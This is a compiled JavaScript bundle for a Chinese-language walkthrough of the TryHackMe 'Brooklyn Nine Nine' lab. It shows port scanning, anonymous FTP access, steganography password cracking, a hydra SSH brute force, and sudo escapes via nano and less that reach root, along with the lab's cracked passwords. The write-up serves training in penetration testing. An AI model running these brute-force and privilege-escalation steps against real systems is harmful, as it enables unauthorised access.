"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[1883],{34247:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>r,toc:()=>c});var t=s(74848),o=s(28453);const a={sidebar_position:15,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u9690\u5199\u672f","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","SUDO"],title:"Brooklyn Nine Nine",sidebar_label:"Brooklyn Nine Nine"},i="Brooklyn Nine Nine",r={id:"box/TryHackMe/15",title:"Brooklyn Nine Nine",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/15.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/15",permalink:"/docs/box/TryHackMe/15",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP",permalink:"/docs/tags/\u533f\u540d\u8eab\u4efd\u767b\u9646-ftp"},{label:"\u9690\u5199\u672f",permalink:"/docs/tags/\u9690\u5199\u672f"},{label:"\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:15,frontMatter:{sidebar_position:15,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-FTP","\u9690\u5199\u672f","\u5bc6\u7801\u7834\u89e3-\u5f31\u5bc6\u7801","SUDO"],title:"Brooklyn Nine Nine",sidebar_label:"Brooklyn Nine Nine"},sidebar:"boxSidebar",previous:{title:"tomghost",permalink:"/docs/box/TryHackMe/14"},next:{title:"Ignite",permalink:"/docs/box/TryHackMe/16"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"holt (\u7b2c\u4e00\u79cd\u65b9\u5f0f)",id:"holt-\u7b2c\u4e00\u79cd\u65b9\u5f0f",level:3},{value:"holt \u2014&gt; root (\u7b2c\u4e00\u79cd\u65b9\u5f0f)",id:"holt--root-\u7b2c\u4e00\u79cd\u65b9\u5f0f",level:3},{value:"jake (\u7b2c\u4e8c\u79cd\u65b9\u5f0f)",id:"jake-\u7b2c\u4e8c\u79cd\u65b9\u5f0f",level:3},{value:"jake \u2014&gt; root (\u7b2c\u4e8c\u79cd\u65b9\u5f0f)",id:"jake--root-\u7b2c\u4e8c\u79cd\u65b9\u5f0f",level:3}];function d(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,o.R)(),...n.components},{Details:s}=e;return s||function(n,e){throw new Error("Expected "+(e?"component":"object")+" `"+n+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h1,{id:"brooklyn-nine-nine",children:"Brooklyn Nine Nine"}),"\n",(0,t.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# rustscan -a 10.10.81.6 -u 5000 -p 21,22,80 -- -sTCV\nPORT   STATE SERVICE REASON  VERSION\n21/tcp open  ftp     syn-ack vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.108.139\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz\n|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=\n|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk\n80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET POST OPTIONS HEAD\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n"})}),"\n",(0,t.jsx)(e.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,t.jsx)(e.p,{children:"FTP \u5b58\u5728\u533f\u540d\u8eab\u4efd\u767b\u9646, \u76f4\u63a5\u767b\u9646\u67e5\u770b\u5176\u4e2d\u5185\u5bb9"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"$ ftp 10.10.81.6                                                                           \nConnected to 10.10.81.6.\n220 (vsFTPd 3.0.3)\nName (10.10.81.6:jtz): anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt\n226 Directory send OK.\nftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 0        114          4096 May 17  2020 .\ndrwxr-xr-x    2 0        114          4096 May 17  2020 ..\n-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u67e5\u770b\u83b7\u53d6\u5230\u7684\u6587\u4ef6\u5185\u5bb9: ",(0,t.jsx)(e.code,{children:"note_to_jake.txt  : \u544a\u8bc9\u6211\u4eec jake \u5bc6\u7801\u662f\u5f31\u5bc6\u7801"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"$ cat note_to_jake.txt                                                                    \nFrom Amy,\n\nJake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine\n"})}),"\n",(0,t.jsx)(e.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240529102751.png",alt:"20240529102751"})}),"\n",(0,t.jsx)(e.p,{children:"\u7f51\u9875\u63d0\u793a\u6211\u4eec\u5b58\u5728\u6587\u4ef6\u9690\u5199\u672f\uff0c \u6211\u4eec\u5bf9\u7167\u7247\u8fdb\u884c\u5bc6\u7801\u7834\u89e3\uff0c \u5e76\u63d0\u53d6\u5176\u4e2d\u6587\u4ef6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-108-139:~# stegcracker brooklyn99.jpg `locate rockyou.txt`\nStegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)\nCopyright (c) 2023 - Luke Paris (Paradoxis)\n\nCounting lines in wordlist..\nAttacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..\nSuccessfully cracked file with password: admin\nTried 20650 passwords\nYour file has been written to: brooklyn99.jpg.out\nadmin\n\nroot@ip-10-10-108-139:~# steghide extract -sf brooklyn99.jpg \nEnter passphrase: \nwrote extracted data to \"note.txt\".\nroot@ip-10-10-108-139:~# cat note.txt \nHolts Password:\nfluffydog12@ninenine\n\nEnjoy!!\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsxs)(s,{children:[(0,t.jsx)("summary",{children:"\u7b2c\u4e00\u79cd\u65b9\u5f0f"}),(0,t.jsx)(e.h3,{id:"holt-\u7b2c\u4e00\u79cd\u65b9\u5f0f",children:"holt (\u7b2c\u4e00\u79cd\u65b9\u5f0f)"}),(0,t.jsx)(e.p,{children:"\u5229\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u8fde\u63a5"}),(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"$ ssh holt@10.10.81.6                                                                   \nholt@10.10.81.6's password: \nLast login: Tue May 26 08:59:00 2020 from 10.10.10.18\nholt@brookly_nine_nine:~$ id\nuid=1002(holt) gid=1002(holt) groups=1002(holt)\n"})}),(0,t.jsx)(e.h3,{id:"holt--root-\u7b2c\u4e00\u79cd\u65b9\u5f0f",children:"holt \u2014> root (\u7b2c\u4e00\u79cd\u65b9\u5f0f)"}),(0,t.jsxs)(e.p,{children:["\u6211\u4eec\u53d1\u73b0\u7528\u6237\u5177\u6709 sudo \u7279\u6743, \u5bfb\u627e\u5230\u76f8\u5173 Payload ",(0,t.jsx)(e.a,{href:"https://gtfobins.github.io/gtfobins/nano/#sudo",children:"nano#sudo"})]}),(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"holt@brookly_nine_nine:~$ sudo -l\nMatching Defaults entries for holt on brookly_nine_nine:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser holt may run the following commands on brookly_nine_nine:\n    (ALL) NOPASSWD: /bin/nano\n"})})]}),"\n",(0,t.jsxs)(s,{children:[(0,t.jsx)("summary",{children:"\u7b2c\u4e8c\u79cd\u65b9\u5f0f"}),(0,t.jsx)(e.p,{children:"\u6211\u4eec\u7684 FTP \u4e2d\u7ed9\u51fa\u63d0\u793a jake \u662f\u4e00\u4e2a\u5f31\u5bc6\u7801\uff0c \u6211\u4eec\u8fdb\u884c\u66b4\u529b\u7834\u89e3"}),(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-108-139:~# hydra -l jake -P `locate rockyou.txt` -t 6 ssh://10.10.81.6\nHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2023-08-05 04:16:52\n[DATA] max 6 tasks per 1 server, overall 6 tasks, 14344398 login tries (l:1/p:14344398), ~2390733 tries per task\n[DATA] attacking ssh://10.10.81.6:22/\n[22][ssh] host: 10.10.81.6   login: jake   password: 987654321\n1 of 1 target successfully completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2023-08-05 04:17:25\n"})}),(0,t.jsx)(e.h3,{id:"jake-\u7b2c\u4e8c\u79cd\u65b9\u5f0f",children:"jake (\u7b2c\u4e8c\u79cd\u65b9\u5f0f)"}),(0,t.jsxs)(e.p,{children:["\u4f7f\u7528\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\n",(0,t.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240529103943.png",alt:"20240529103943"})]}),(0,t.jsx)(e.h3,{id:"jake--root-\u7b2c\u4e8c\u79cd\u65b9\u5f0f",children:"jake \u2014> root (\u7b2c\u4e8c\u79cd\u65b9\u5f0f)"}),(0,t.jsxs)(e.p,{children:["\u63a5\u7740\u6211\u4eec\u53d1\u73b0\u7528\u6237\u5177\u6709 sudo \u7279\u6743 ",(0,t.jsx)(e.a,{href:"https://gtfobins.github.io/gtfobins/less/#sudo",children:"less|GTFOBins"})]}),(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"jake@brookly_nine_nine:/home$ sudo -l\nMatching Defaults entries for jake on brookly_nine_nine:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jake may run the following commands on brookly_nine_nine:\n    (ALL) NOPASSWD: /usr/bin/less\n"})}),(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"jake@brookly_nine_nine:/home$ sudo /usr/bin/less /etc/profile\n# id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})]})}function h(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},28453:(n,e,s)=>{s.d(e,{R:()=>i,x:()=>r});var t=s(96540);const o={},a=t.createContext(o);function i(n){const e=t.useContext(a);return t.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function r(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:i(n.components),t.createElement(a.Provider,{value:e},n.children)}}}]);